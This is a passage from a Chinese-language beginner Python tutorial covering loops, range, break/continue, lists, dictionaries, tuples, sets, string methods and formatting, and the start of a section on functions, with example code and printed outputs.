定义函数时的循环体\n\n```python\nanswer = input('您是会员吗？y/n')\nif ansewr == 'y':\n    pass\nelse:\n    pass\n```\n\n## 8.3 range函数\n\nrange函数用于生成一个整数序列，返回值是一个迭代器对象。\n\n```python\n#创建一个(0, stop)之间的整数序列，步长为1\nrange(stop)\n\n#创建一个(start, stop)之间的整数序列，步长为1\nrange(start, stop)\n\n#创建一个(start, stop, step)之间的整数序列，步长为step\nrange(start, stop, step)\n```\n\n```python\nr = range(10)\nprint(r)\nprint(list(r))\n\nr = range(1, 10)\nprint(list(r))\n\nr = range(1, 10, 2)\nprint(list(r))\nprint(10 in r)\n'''\nrange(0, 10)\n[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\n[1, 2, 3, 4, 5, 6, 7, 8, 9]\n[1, 3, 5, 7, 9]\nFalse\n'''\n```\n\n## 8.4 循环结构\n\n### 8.4.1 while循环\n\n```python\nwhile 条件表达式:\n    条件执行体(循环体)\n```\n\n```python\na = 1\nwhile a < 10:\n    print(a)\n    a += 1\n```\n\n```python\n#计算1-100偶数和\na = 1\nresult = 0\nwhile a <= 100:\n    #if a % 2 == 0:\n    if not a%2:\n        result += a\n    a += 1\nprint(result)\n```\n\n### 8.4.2 for-in循环\n\nin表达从(字符串、序列等)中依次取值，又称为遍历。\n\n```python\nfor 自定义的变量 in 可迭代对象:\n    循环体\n```\n\n循环体内不需要访问自定义变量，可以将自定义变量替代为下划线。\n\n```python\nfor item in 'v5le0n9':\n    print(item)\n    \nfor i in range(10):\n    print(i)\n    \nfor _ in range(5):\n    print('hello')\n```\n\n```python\n#计算1-100偶数和\nsum = 0\nfor i in range(1, 101):\n    if not i%2:\n    \tsum += i\nprint(sum)\n```\n\n```python\n#计算100-999的水仙花数：153=1**3+5**3+3**3\nfor i in range(100,1000):\n    ge = i % 10\n    shi = i // 10 % 10\n    bai = i // 100\n    if ge**3+bai**3+shi**3 == i:\n        print(i)\n'''\n153\n370\n371\n407\n'''\n```\n\n## 8.5 流程控制语句\n\n### 8.5.1 break语句\n\n用于结束循环结构，通常与分支结构if一起使用。\n\n```python\nfor i in range(3):\n    pwd = input(\"请输入密码：\")\n    if pwd == '8888':\n        print('密码正确')\n        break\n    else:\n        print('密码不正确')\n```\n\n```python\na = 0\nwhile a < 3:\n    pwd = input(\"请输入密码：\")\n    if pwd == '8888':\n        print('密码正确')\n        break\n    else:\n        print('密码不正确')\n    a += 1\n```\n\n### 8.5.2 continue语句\n\n用于结束当前循环，进入下一次循环，通常与分支结构中的if一起使用。\n\n```python\n#输出1-50之间所有5的倍数\nfor i in range(1,51):\n    if i%5 != 0:\n        continue\n    print(i)       \n```\n\n## 8.6 else语句\n\n```python\n#if条件表达式不成立时执行else\nif...else\n\n#没有碰到break时执行else\nwhile...else\nfor...else\n```\n\n```python\nfor i in range(3):\n    pwd = input(\"请输入密码：\")\n    if pwd == '8888':\n        print('密码正确')\n        break\n    else:\n        print('密码不正确')\nelse:\n    print('密码已锁定')\n```\n\n```python\na = 0\nwhile a < 3:\n    pwd = input(\"请输入密码：\")\n    if pwd == '8888':\n        print('密码正确')\n        break\n    else:\n        print('密码不正确')\n    a += 1\nelse:\n    print('密码已锁定')\n```\n\n## 8.7 嵌套循环\n\n```python\n#打印九九乘法表\nfor i in range(1,10):\n    for j in range(1,i+1):\n        result = i * j\n        print(str(i) + '*' + str(j) + '=' + str(result), end='\\t')#也可以写成end=' '\n    print('\\n')#也可以写成print()\n```\n\n嵌套循环中的break和continue用于控制本层循环。\n\n```python\nfor _ in range(5):\n    for j in range(1, 11):\n        if j%2==0:\n            break\n        print(j)\n'''\n1\n1\n1\n1\n1\n'''\n```\n\n```python\nfor _ in range(5):\n    for j in range(1, 11):\n        if j%2==0:\n            continue\n        print(j, end='\\t')\n    print()\n'''\n1       3       5       7       9\n1       3       5       7       9\n1       3       5       7       9\n1       3       5       7       9\n1       3       5       7       9\n'''\n```\n\n# 9. 列表\n\nPython中的列表可以存储不同的数据类型。\n\n```python\nlst = ['hello', 98, 44.2, True]\nprint(id(lst))\nprint(type(lst))\nprint(lst)\n'''\n1943553438088\n<class 'list'>\n['hello', 98, 44.2, True]\n'''\n```\n\n## 9.1 创建列表\n\n```python\nlst = ['hello', 98, True]\nlst2 = list(['hello', 98, True])\nlst3 = []\nlst4 = list()\n```\n\n## 9.2 列表的特点\n\n1. 列表元素按顺序有序排序\n2. 索引映射唯一一个数据\n3. 列表可以存储重复数据\n4. 任意数据类型混存\n5. 根据需要动态分配和回收内存\n\n```python\nlst = ['hello', 98, True, 98]\nprint(lst)\nprint(lst[0], lst[-4])\n'''\n['hello', 98, True, 98]\nhello hello\n'''\n```\n\n## 9.3 列表的查询\n\n### 9.3.1 获取列表中指定元素的索引\n\n列表中存在N个相同元素时，只返回相同元素中的第一个元素的索引。如果查询的元素在列表中不存在，则会抛出`ValueError`。还可以在指定的start和stop之间进行查找。\n\n```python\nlst = ['hello', 98, True, 98]\nprint(lst.index(98))\n#print(lst.index('hei'))\t#引发异常\nprint(lst.index(98,2,4))\n'''\n1\n3\n'''\n```\n\n### 9.3.2 获取列表中的单个元素\n\n正向索引从0到N-1，逆向索引从-N到-1，指定索引不存在，则会抛出`ValueError`。\n\n```python\nlst = ['hello', 'world', 98, 'hello', 'world', 234]\nprint(lst[2])\nprint(lst[-3])\n'''\n98\nhello\n'''\n```\n\n### 9.3.3 获取列表中的多个元素\n\n```python\n列表名[start: stop: step]\n```\n\n```python\nlst = [10,20,30,40,50,60,70,80,90]\nprint('原列表', id(lst))\nlst2 = lst[1:6:1]\nprint('切片列表', id(lst2))\nprint(lst2)\nprint(lst[:6:2])\nprint(lst[::-1])\nprint(lst[6:0:-2])\n'''\n原列表 1347062984904\n切片列表 1347063015496\n[20, 30, 40, 50, 60]\n[10, 30, 50]\n[90, 80, 70, 60, 50, 40, 30, 20, 10]\n[70, 50, 30]\n'''\n```\n\n### 9.3.4 列表元素的判断与遍历\n\n```python\nlst = [10,20,'python','world']\nprint(10 in lst)\nprint(20 not in lst)\nfor i in lst:\n    print(i)\n'''\nTrue\nFalse\n10\n20\npython\nworld\n'''\n```\n\n## 9.4 列表元素的添加\n\n```python\nlst = [10,20,30]\nprint('添加元素之前',lst,id(lst))\nlst.append(100)\nprint('添加元素之后',lst,id(lst))\n\n#将lst2作为一个元素添加到lst的末尾\nlst2 = ['hello','v5le0n9']\nlst.append(lst2)\nprint(lst)\n\n#向列表的末尾一次性添加多个元素\nlst.extend(lst2)\nprint(lst)\n\n#在下标为1的位置上插入元素90\nlst.insert(1,90)\nprint(lst)\n\n#列表切片\nlst3 = [True, False, 'hello']\nlst[1:3] = lst3#将lst3的所有元素覆盖lst下标为1和2的元素\nprint(lst)\nlst[:] = lst3\nprint(lst)\n'''\n添加元素之前 [10, 20, 30] 1236490777544\n添加元素之后 [10, 20, 30, 100] 1236490777544\n[10, 20, 30, 100, ['hello', 'v5le0n9']]\n[10, 20, 30, 100, ['hello', 'v5le0n9'], 'hello', 'v5le0n9']\n[10, 90, 20, 30, 100, ['hello', 'v5le0n9'], 'hello', 'v5le0n9']\n[10, True, False, 'hello', 30, 100, ['hello', 'v5le0n9'], 'hello', 'v5le0n9']\n[True, False, 'hello']\n'''\n```\n\n## 9.5 列表元素的删除\n\n```python\nlst = [10,20,30,40,50,60,30]\n#移除列表重复元素的第一个元素\nlst.remove(30)\nprint(lst)\n\n#根据索引移除元素\nlst.pop(1)\nprint(lst)\nlst.pop()#默认将最后一个元素移除\nprint(lst)\n\n#切片，删除至少一个元素，产生一个新的列表对象\nnew_lst = lst[1:3]\nprint('原列表',lst)\nprint('切片后产生的新列表', new_lst)\n\n#不产生新的列表对象，删除原列表内容\nlst[1:3] = []\nprint(lst)\n\n#清除列表中的所有元素\nlst.clear()\nprint(lst)\n\n#将列表对象删除\ndel lst\n#print(lst)\t#抛出异常\n'''\n[10, 20, 40, 50, 60, 30]\n[10, 40, 50, 60, 30]\n[10, 40, 50, 60]\n原列表 [10, 40, 50, 60]\n切片后产生的新列表 [40, 50]\n[10, 60]\n[]\n'''\n```\n\n## 9.6 列表元素的修改\n\n```python\nlst = [10,20,30,40]\nlst[2] = 100\nprint(lst)\n\nlst[1:3] = [300,400,500,600]\nprint(lst)\n'''\n[10, 20, 100, 40]\n[10, 300, 400, 500, 600, 40]\n'''\n```\n\n## 9.7 列表元素的排序\n\n```python\nlst = [20,40,10,98,54]\nprint('排序前的列表', lst, id(lst))\n\n#开始排序，调用列表对象的sort方法，升序排序\nlst.sort()\nprint('排序后的列表', lst, id(lst))\n\nlst.sort(reverse = True)\nprint(lst)\n\n#使用内置函数sorted()对列表进行排序，将产生一个新的列表对象\nlst = [20,40,10,98,54]\nprint(lst, id(lst))\nnew_lst = sorted(lst)\nprint(new_lst, id(new_lst))\ndesc_lst = sorted(lst, reverse = True)\nprint(desc_lst)\n'''\n排序前的列表 [20, 40, 10, 98, 54] 1692186177736\n排序后的列表 [10, 20, 40, 54, 98] 1692186177736\n[98, 54, 40, 20, 10]\n[20, 40, 10, 98, 54] 1692186208264\n[10, 20, 40, 54, 98] 1692186177736\n[98, 54, 40, 20, 10]\n'''\n```\n\n## 9.8 列表生成式\n\n```python\nlst = [i for i in range(1,10)]\nprint(lst)\nlst2 = [i*i for i in range(1,10)]\nprint(lst2)\n'''\n[1, 2, 3, 4, 5, 6, 7, 8, 9]\n[1, 4, 9, 16, 25, 36, 49, 64, 81]\n'''\n```\n\n# 10. 字典\n\n以键值对的方式存储数据，是一个无序的序列。\n\n字典的实现原理与查字典类似，查字典是先根据部首或拼音查找对应的页码，python中的字典是根据key查找value所在的位置。\n\n## 10.1 字典的创建\n\n```python\nscores = {'张三':100, '李四':87, '王五':95}\nprint(scores)\nprint(type(scores))\n\nstudent = dict(name='jack', age='20')\nprint(student)\n\nd = {}\nd2 = dict()\nprint(d,d2)\n'''\n{'张三': 100, '李四': 87, '王五': 95}\n<class 'dict'>\n{'name': 'jack', 'age': '20'}\n{} {}\n'''\n```\n\n## 10.2 字典元素的获取\n\n```python\nscores = {'张三':100, '李四':87, '王五':95}\nprint(scores['张三'])\n#print(scores['陈六'])\t#异常\n\nprint(scores.get('张三'))\nprint(scores.get('陈六'))\nprint(scores.get('麻七',99))#当麻七不存在在字典里，99为默认值\n'''\n100\n100\nNone\n99\n'''\n```\n\n## 10.3 字典的增删改\n\n```python\n#字典的判断\nscores = {'张三':100, '李四':87, '王五':95}\nprint('张三' in scores)\nprint('张三' not in scores)\n\n#字典元素的删除\ndel scores['张三']\nprint(scores)\n\nscores.clear()\nprint(scores)\n\n#字典元素的新增\nscores['陈六'] = 98\nprint(scores)\n\n#字典元素的修改\nscores['陈六'] = 80\nprint(scores)\n'''\nTrue\nFalse\n{'李四': 87, '王五': 95}\n{}\n{'陈六': 98}\n{'陈六': 80}\n'''\n```\n\n## 10.4 获取字典视图\n\n```python\nscores = {'张三':100, '李四':87, '王五':95}\n\n#获取所有的key\nkeys = scores.keys()\nprint(keys)\nprint(type(keys))\n\n#将所有的key组成的视图转换成列表\nprint(list(keys))\n\n#获取所有的value\nvalues = scores.values()\nprint(values)\nprint(type(values))\nprint(list(values))\n\n#获取所有的键值对\nitems = scores.items()\nprint(items)\nprint(list(items))\t#转换之后的列表元素由元组组成\n'''\ndict_keys(['张三', '李四', '王五'])\n<class 'dict_keys'>\n['张三', '李四', '王五']\ndict_values([100, 87, 95])\n<class 'dict_values'>\n[100, 87, 95]\ndict_items([('张三', 100), ('李四', 87), ('王五', 95)])\n[('张三', 100), ('李四', 87), ('王五', 95)]\n'''\n```\n\n## 10.5 字典元素的遍历\n\n```python\nscores = {'张三':100, '李四':87, '王五':95}\nfor item in scores:\n    print(item, scores[item], scores.get(item))\n'''\n张三 100 100\n李四 87 87\n王五 95 95\n'''\n```\n\n## 10.6 字典的特点\n\n- 字典中的所有元素都是一个键值对，key不允许重复，value可以重复\n\n- 字典中的元素是无序的\n- 字典中的key必须是不可变对象\n- 字典也可以根据需要动态地伸缩\n- 字典会浪费较大的内存，是一种使用空间换时间的数据结构\n\n## 10.7 字典生成式\n\n### 10.7.1 zip函数\n\n用于将可迭代对象作为参数，将对象中对应的元素打包成一个元组，然后返回有这些元组组成的列表。\n\n### 10.7.2 字典生成式\n\n```python\nitems = ['hei', 'biu', 'v5le0n9']\nprices = [96, 98, 55, 66]\nd = {item.upper():prices for item,prices in zip(items,prices)}\nprint(d)\n'''\n{'HEI': 96, 'BIU': 98, 'V5LE0N9': 55}\n'''\n```\n\n# 11. 元组\n\n元组是一个不可变序列。\n\n不可变序列：字符串、元组，没有增删改操作。\n\n可变序列：列表、字典，可以对序列执行增删改操作，对象地址不发生更改。\n\n元组中存储的是对象的引用。\n\n- 如果元组中对象本身为不可变对象，则不能再引用其它对象\n- 如果元组中对象是可变对象，则可变对象的引用不允许改变，但数据可以改变\n\n```python\nt = (10,[20,30],9)\nprint(t)\nprint(type(t))\nprint(t[0],type(t[0]),id(t[0]))\nprint(t[1],type(t[1]),id(t[1]))\nprint(t[2],type(t[2]),id(t[2]))\nprint(id(100))\n#t[1] = 100\t\t#元组不允许修改元素\n\n#由于[20,30]是列表，而列表是可变序列，所以可以向列中添加元素，而列表的内存地址不变\nt[1].append(100)\nprint(t, id(t[1]))\n'''\n(10, [20, 30], 9)\n<class 'tuple'>\n10 <class 'int'> 140736278463024\n[20, 30] <class 'list'> 2507573096776\n9 <class 'int'> 140736278462992\n140736278465904\n(10, [20, 30, 100], 9) 2507573096776\n'''\n```\n\n## 11.1 元组的创建方式\n\n```python\nt = ('python', 'hello', 90)\nprint(t, type(t))\nt2 = 'python', 'hello', 90\nprint(t2, type(t2))\n\n#如果元组中只有一个元素，需要使用逗号和小括号\nt3 = ('python',)\nprint(t3, type(t3))\n\nt1 = tuple(('python', 'hello', 90))\nprint(t1)\n\nt4 = ()\nt5 = tuple()\nprint(t4, t5)\n'''\n('python', 'hello', 90) <class 'tuple'>\n('python', 'hello', 90) <class 'tuple'>\n('python',) <class 'tuple'>\n('python', 'hello', 90)\n() ()\n'''\n```\n\n## 11.2 元组的遍历\n\n```python\nt = ('python', 'hello', 90)\nprint(t[0])\nfor i in t:\n    print(i)\n'''\npython\npython\nhello\n90\n'''\n```\n\n# 12. 集合\n\n集合与列表、字典一样都属于可变类型的序列，集合是没有的value的字典。\n\n## 12.1 集合的创建\n\n```python\n#集合中的元素不允许重复，集合中的元素是无序的\ns = {2,3,4,5,5,6,7,7}\nprint(s)\n\ns1 = set(range(6))\nprint(s1, type(s1))\n\n#将列表转化为集合中\nprint(set([1,2,4,5,5,6,6]))\n\n#将元组转化为集合\nprint(set((3,4,43,541)))\n\n#将字符串转化为集合\nprint(set('python'))\n\n#将集合转化为集合\nprint(set({124,2,3,5}))\n\n#定义空集合\ns2 = set()\nprint(s2)\n'''\n{2, 3, 4, 5, 6, 7}\n{0, 1, 2, 3, 4, 5} <class 'set'>\n{1, 2, 4, 5, 6}\n{43, 3, 4, 541}\n{'h', 'o', 'p', 't', 'n', 'y'}\n{2, 3, 124, 5}\nset()\n'''\n```\n\n## 12.2 集合的增删改\n\n```python\n#集合元素的判断\ns = {10,20,30,405,50}\nprint(10 in s)\nprint(10 not in s)\n\n#集合元素的新增操作\ns.add(200)\t#一次添加一个元素\nprint(s)\ns.update({200,300,400})\t#一次至少添加一个元素\nprint(s)\ns.update([75,60])\nprint(s)\ns.update((78,22))\nprint(s)\n'''\nTrue\nFalse\n{200, 10, 50, 20, 405, 30}\n{200, 10, 300, 400, 50, 20, 405, 30}\n{200, 10, 75, 300, 400, 50, 20, 405, 60, 30}\n{200, 10, 75, 300, 78, 400, 50, 20, 405, 22, 60, 30}\n'''\n```\n\n```python\n#集合元素的删除\ns = {10,20,30,405,50}\ns.remove(30)\n#s.remove(500)\t#抛出异常\nprint(s)\n\n#不抛出异常\ns.discard(500)\ns.discard(10)\nprint(s)\n\n#随机删除一个元素\ns.pop()\n#s.pop(50)\t#不能指定参数\nprint(s)\n\ns.clear()\nprint(s)\n'''\n{10, 50, 20, 405}\n{50, 20, 405}\n{20, 405}\nset()\n'''\n```\n\n## 12.3 集合间的关系\n\n```python\n#判断两个集合是否相等\ns = {10,20,30,40}\ns2 = {30,40,20,10}\nprint(s == s2)\nprint(s != s2)\n\n#判断是否为子集\ns1 = {10,20,30,40,50,60}\ns2 = {10,20,30,40}\ns3 = {10,20,90}\ns4 = {10,20,90}\nprint(s2.issubset(s1))\nprint(s3.issubset(s1))\nprint(s4.issubset(s3))\n\n#判断是否为父集\nprint(s1.issuperset(s2))\nprint(s1.issuperset(s3))\nprint(s4.issuperset(s3))\n\n#是否没有交集\nprint(s2.isdisjoint(s3))\ns4 = {100,200,300}\nprint(s4.isdisjoint(s3))\n'''\nTrue\nFalse\nTrue\nFalse\nTrue\nTrue\nFalse\nTrue\nFalse\nTrue\n'''\n```\n\n## 12.4 集合的数学操作\n\n```python\n#交集\ns1 = {10,20,30,40}\ns2 = {20,30,40,50,60}\nprint(s1.intersection(s2))\nprint(s1 & s2)\t#intersection()与&等价，交集操作\nprint(s1, s2)\n\n#并集\nprint(s1.union(s2))\nprint(s1 | s2)\nprint(s1, s2)\n\n#差集\nprint(s1.difference(s2))\nprint(s1 - s2)\nprint(s1, s2)\n\n#对称差集\nprint(s1.symmetric_difference(s2))\nprint(s1 ^ s2)\nprint(s1, s2)\n'''\n{40, 20, 30}\n{40, 20, 30}\n{40, 10, 20, 30} {40, 50, 20, 60, 30}\n{40, 10, 50, 20, 60, 30}\n{40, 10, 50, 20, 60, 30}\n{40, 10, 20, 30} {40, 50, 20, 60, 30}\n{10}\n{10}\n{40, 10, 20, 30} {40, 50, 20, 60, 30}\n{50, 10, 60}\n{50, 10, 60}\n{40, 10, 20, 30} {40, 50, 20, 60, 30}\n'''\n```\n\n## 12.5 集合生成式\n\n用于生成集合的公式。\n\n```python\n#列表生成式\nlst = [i*i for i in range(10)]\nprint(lst)\n\n#集合生成式\ns = {i*i for i in range(10)}\nprint(s)\n'''\n[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]\n{0, 1, 64, 4, 36, 9, 16, 49, 81, 25}\n'''\n```\n\n# 13. 列表、字典、元组、集合总结\n\n| 数据结构    | 是否可变 | 是否重复                 | 是否有序 | 定义符号    |\n| ----------- | -------- | ------------------------ | -------- | ----------- |\n| 列表(list)  | 可变     | 可重复                   | 有序     | []          |\n| 元组(tuple) | 不可变   | 可重复                   | 有序     | ()          |\n| 字典(dict)  | 可变     | key不可重复，value可重复 | 无序     | {key:value} |\n| 集合(set)   | 可变     | 不可重复                 | 无序     | {}          |\n\n# 14. 字符串\n\n## 14.1 字符串的创建与驻留机制\n\n驻留机制的几种情况：\n\n- 字符串的长度为0或1时\n- 符合标识符的字符串\n- 字符串只在编译时进行驻留，而非运行时\n- [-5,256]之间的整数数字\n\n```python\na = 'v5le0n9'\nb = \"v5le0n9\"\nc = '''v5le0n9'''\nprint(a, id(a))\nprint(b, id(b))\nprint(c, id(c))\n\na = 'abc%'\nb = 'abc%'\nprint(id(a), id(b))#在交互式窗口不同，在VS相同\n\na = '%'\nb = '%'\nprint(id(a), id(b))\n\na = 'abc'\nb = 'ab' + 'c'\nc = ''.join(['ab','c'])\nprint(a, id(a), type(a))\nprint(b, id(b), type(b))\nprint(c, id(c), type(c))\n'''\nv5le0n9 1860778217520\nv5le0n9 1860778217520\nv5le0n9 1860778217520\n1860778217968 1860778217968\n1860707424368 1860707424368\nabc 2658633804016 <class 'str'>\nabc 2658633804016 <class 'str'>\nabc 2658669390576 <class 'str'>\n'''\n```\n\n## 14.2 字符串的常用操作\n\n### 14.2.1 字符串的查询\n\n| 功能 | 方法名称 | 作用                                                         |\n| ---- | -------- | ------------------------------------------------------------ |\n| 查询 | index()  | 查找子串substr第一次出现的位置，如果查找的子串不存在时，则抛出ValueError |\n|      | rindex() | 查找子串substr最后一次出现的位置，如果查找的子串不存在时，则抛出ValueError |\n|      | find()   | 查找子串substr第一次出现的位置，如果查找的子串不存在时，则返回-1 |\n|      | rfind()  | 查找子串substr最后一次出现的位置，如果查找的子串不存在时，则返回-1 |\n\n```python\ns = 'hello,hello'\nprint(s.index('lo'))\nprint(s.rindex('lo'))\nprint(s.find('lo'))\nprint(s.rfind('lo'))\n'''\n3\n9\n3\n9\n'''\n```\n\n### 14.2.2 字符串大小写转换\n\n```python\ns = 'hello python'\na = s.upper()\nprint(s,id(s))\nprint(a,id(a))\nprint(a.lower(),id(a.lower()))\n'''\nhello python 1765330538608\nHELLO PYTHON 1765267539440\nhello python 1765330535920\n'''\n```\n\n```python\ns2 = 'hello V5LE0N9'\nprint(s2.swapcase())\nprint(s2.title())\nprint(s2.capitalize())\n'''\nHELLO v5le0n9\nHello V5Le0N9\nHello v5le0n9\n'''\n```\n\n### 14.2.3 字符串的对齐\n\n| 功能       | 方法名称 | 作用                                                         |\n| ---------- | -------- | ------------------------------------------------------------ |\n| 字符串对齐 | center() | 居中对齐，第一个参数指定宽度，第二个参数指定填充符，第二个参数可选，默认空格，如果设置宽度小于实际宽度则返回原字符串 |\n|            | ljust()  | 左对齐，第一个参数指定宽度，第二个参数指定填充符，第二个参数可选，默认空格，如果设置宽度小于实际宽度则返回原字符串 |\n|            | rjust()  | 右对齐，第一个参数指定宽度，第二个参数指定填充符，第二个参数可选，默认空格，如果设置宽度小于实际宽度则返回原字符串 |\n|            | zfill()  | 右对齐，左边用0填充，该方法只接收一个参数，用于指定字符串的宽度，如果指定的宽度小于等于字符串长度，则返回字符串本身 |\n\n```python\ns = 'hello v5le0n9'\nprint(s.center(20,'*'))\nprint(s.ljust(20,'*'))\nprint(s.rjust(20,'*'))\nprint(s.zfill(20))\n'''\n***hello v5le0n9****\nhello v5le0n9*******\n*******hello v5le0n9\n0000000hello v5le0n9\n'''\n```\n\n### 14.2.4 字符串的劈分\n\n| 功能         | 方法名称 | 作用                                                         |\n| ------------ | -------- | ------------------------------------------------------------ |\n| 字符串的劈分 | split()  | 从字符串的左边开始劈分，默认的劈分字符是空格，返回值是一个列表。以通过参数sep指定劈分字符串是劈分符。通过参数maxsplit指定劈分字符串时的最大劈分次数，在经过最大次劈分后，剩余的子串会单独作为一部分。 |\n|              | rsplit() | 从字符串的右边开始劈分，默认的劈分字符是空格，返回值是一个列表。通过参数maxsplit指定劈分字符串时的最大劈分次数，在经过最大次劈分后，剩余的子串会单独作为一部分。 |\n\n```python\ns = 'hello v5le0n9 hhhh'\nlst = s.split()\nprint(lst)\n\nsl = 'hello|v5le0n9|hhh'\nprint(sl.split(sep='|'))\nprint(sl.split(sep='|',maxsplit=1))\n\ns = 'hello v5le0n9 hhhh'\nlst = s.rsplit()\nprint(lst)\nsl = 'hello|v5le0n9|hhh'\nprint(sl.rsplit(sep='|'))\nprint(sl.rsplit(sep='|',maxsplit=1))\n'''\n['hello', 'v5le0n9', 'hhhh']\n['hello', 'v5le0n9', 'hhh']\n['hello', 'v5le0n9|hhh']\n['hello', 'v5le0n9', 'hhhh']\n['hello', 'v5le0n9', 'hhh']\n['hello|v5le0n9', 'hhh']\n'''\n```\n\n### 14.2.5 字符串的判断\n\n| 功能             | 方法名称       | 作用                                                         |\n| ---------------- | -------------- | ------------------------------------------------------------ |\n| 判断字符串的方法 | isidentifier() | 判断指定的字符串是否为合法的标识符                           |\n|                  | isspace()      | 判断指定的字符串是否全部由空白字符组成(回车、换行、水平制表符等) |\n|                  | isalpha()      | 判断指定的字符串是否全部由字母组成                           |\n|                  | isdecimal()    | 判断指定的字符串是否全部由十进制数字组成                     |\n|                  | isnumeric()    | 判断指定的字符串是否全部由数字组成                           |\n|                  | isalnum()      | 判断指定的字符串是否全部由字母和数字组成                     |\n\n```python\ns = 'hello v5le0n9'\nprint(s.isidentifier())\t\t\t#False\nprint('hello'.isidentifier())\t#True\nprint('张三'.isidentifier())\t\t#True\nprint('\\t'.isspace())\t\t\t#True\nprint('abc'.isalpha())\t\t\t#True\nprint('张三'.isalpha())\t\t\t#True\nprint('123'.isdecimal())\t\t#True\nprint('123四'.isdecimal())\t\t#False\nprint('123'.isnumeric())\t\t#True\nprint('123四'.isnumeric())\t\t#True\nprint('abc1'.isalnum())\t\t\t#True\n```\n\n### 14.2.6 替换与合并\n\n| 功能         | 方法名称  | 作用                                                         |\n| ------------ | --------- | ------------------------------------------------------------ |\n| 字符串替换   | replace() | 第一个参数指定被替换的子串，第二个参数指定替换子串的字符串，该方法返回替换后得到的字符串，替换前的字符串不发生变化，调用该方法时可以通过第三个参数指定最大替换次数 |\n| 字符串的合并 | join()    | 将列表或元组中的字符串合并成一个字符串                       |\n\n```python\ns = 'hello v5le0n9'\nprint(s.replace('v5le0n9','Java'))\ns1 = 'hello hei ha hu hu hu'\nprint(s1.replace('hu','hello',2))\n\nlst = ['hello', 'java', 'python']\nprint('|'.join(lst))\nprint(' '.join(lst))\n\nt = ('hello', 'java', 'python')\nprint(''.join(t))\nprint('*'.join('python'))\n'''\nhello Java\nhello hei ha hello hello hu\nhello|java|python\nhello java python\nhellojavapython\np*y*t*h*o*n\n'''\n```\n\n## 14.3 字符串的比较\n\n比较规则：首先比较两个字符串中的第一个字符，如果相等则继续比较下一个字符，依次比较下去，直到两个字符串中的字符不相等时，其比较结果就是两个字符串的比较结果，两个字符串中的所有后续字符将不再被比较。\n\n比较原理：liang\n\n```python\nprint('apple' > 'app')\t#True\nprint('apple' > 'banana')\t#False，相当于97 > 98\nprint(ord('a'),ord('b'))\t#97 98\nprint(ord('梁'))\t\t\t\t#26753\n\n'''\n== 比较的是value\nis 比较的是id是否相等\n'''\na = b = 'python'\nc = 'python'\nprint(a == b)\nprint(a == c)\nprint(a is b)\nprint(a is c)\n'''\nTrue\nTrue\nTrue\nTrue\n'''\n```\n\n## 14.4 字符串的切片\n\n```python\ns = 'hello v5le0n9'\ns1 = s[:5]\ns2 = s[6:]\ns3 = '!'\nnewstr = s1 + s3 +s2\nprint(s1)\nprint(s2)\nprint(newstr)\nprint(s[6:10:2])\nprint(s[::-1])\nprint(s[-7::1])\n'''\nhello\nv5le0n9\nhello!v5le0n9\nvl\n9n0el5v olleh\nv5le0n9\n'''\n```\n\n## 14.5 格式化字符串\n\n```python\nname = '张三'\nage = 20\nprint('我叫%s，今年%d岁' % (name, age))\nprint('我叫{0}，今年{1}岁'.format(name, age))\nprint(f'我叫{name}，今年{age}岁')\n'''\n我叫张三，今年20岁\n我叫张三，今年20岁\n我叫张三，今年20岁\n'''\n```\n\n```python\nprint('%10d' % 99)\t#10表示宽度\nprint('hellohello')\t\nprint('%.3f' % 3.1415926)\t#.3表示小数点后3位\nprint('%10.3f' % 3.1415926)\n'''\n        99\nhellohello\n3.142\n     3.142\n'''\n```\n\n```python\nprint('{0}'.format(3.1415926))\nprint('{0:.3}'.format(3.1415926))\t#一共3位数\nprint('{0:.3f}'.format(3.1415926))\t#3f表三位小数\nprint('{0:10.3}'.format(3.1415926))\t#同时设置宽度和精度，一共10位，其中3位是小数\n'''\n3.1415926\n3.14\n3.142\n      3.14\n'''\n```\n\n## 14.6 字符串的编码转换\n\n编码：将字符串转换为二进制数据(bytes)\n\n解码：将bytes类型的数据转换成字符串类型\n\n```python\ns = \"天涯共此时\"\n\n#编码\nprint(s.encode(encoding = 'GBK'))\t#GBK一个中文占两个字节\nprint(s.encode(encoding = 'UTF-8'))#UTF8一个中文占三个字节\n\n#解码\nbyte = s.encode(encoding = 'GBK')\nprint(byte.decode(encoding = 'GBK'))\nbyte = s.encode(encoding = 'UTF-8')\nprint(byte.decode(encoding = 'UTF-8'))\n'''\nb'\\xcc\\xec\\xd1\\xc4\\xb9\\xb2\\xb4\\xcb\\xca\\xb1'\nb'\\xe5\\xa4\\xa9\\xe6\\xb6\\xaf\\xe5\\x85\\xb1\\xe6\\xad\\xa4\\xe6\\x97\\xb6'\n天涯共此时\n天涯共此时\n'''\n```\n\n# 15. 函数\n\n函数就是执行特定任务和完成特定功能的一段代码。\n\n为什么需要函数？\n\n- 复用代码\n- 隐藏实现细节\n- 提高可维护性\n- 提高可读性便于调试\n\n## 15.1 函数的创建与调用\n\n```python\ndef calc(a, b):\n    c = a + b\n    return c\nresult = calc(10, 20)\nprint(result)\n'''\n30\n'''\n```\n\n## 15.2 函数的参数传递\n\n```python\ndef calc(a, b):\t#a,b为形参\n    c = a + b\n    return c\nresult = calc(10, 20)\t#10，20为实参\nprint(result)\nresult = (calc(b=10, a=20))\t#等号左侧为关键字参数\n```\n\n```python\ndef fun(arg1, arg2):\n    print('arg1 = ', arg1)\n    print('arg2 = ', arg2)\n    arg1 = 100\n    arg2.append(10)\n    print('arg1 = ', arg1)\n    print('arg2 = ', arg2)\nn1 = 11\nn2 = [22,33,44]\nprint(n1)\nprint(n2)\nfun(n1,n2)\nprint(n1)\nprint(n2)\n'''\n11\n[22, 33, 44]\narg1 =  11\narg2 =  [22, 33, 44]\narg1 =  100\narg2 =  [22, 33, 44, 10]\n11\n[22, 33, 44, 10]\n'''\n```\n\n## 15.3 函数的返回值\n\n如果函数没有返回值，return可以省略不写。\n\n函数的返回值，如果是1个，直接返回类型。\n\n函数的返回值，如果是多个，返回的结果为元组。\n\n```python\ndef fun(num):\n    odd = []\n    even = []\n    for i in num:\n        if i % 2:\n            odd.append(i)\n        else:\n            even.append(i)\n    return odd, even\nprint(fun([10,29,34,23,44,53,55]))\n'''\n([29, 23, 53, 55], [10, 34, 44])\n'''\n```\n\n## 15.4 函数的参数定义\n\n### 15.4.1 默认值参数\n\n函数定义是，给形参设置默认值，只有与默认值不符的时候才需要传递实参。\n\n```python\ndef fun(a, b=10):\n    print(a, b)\n    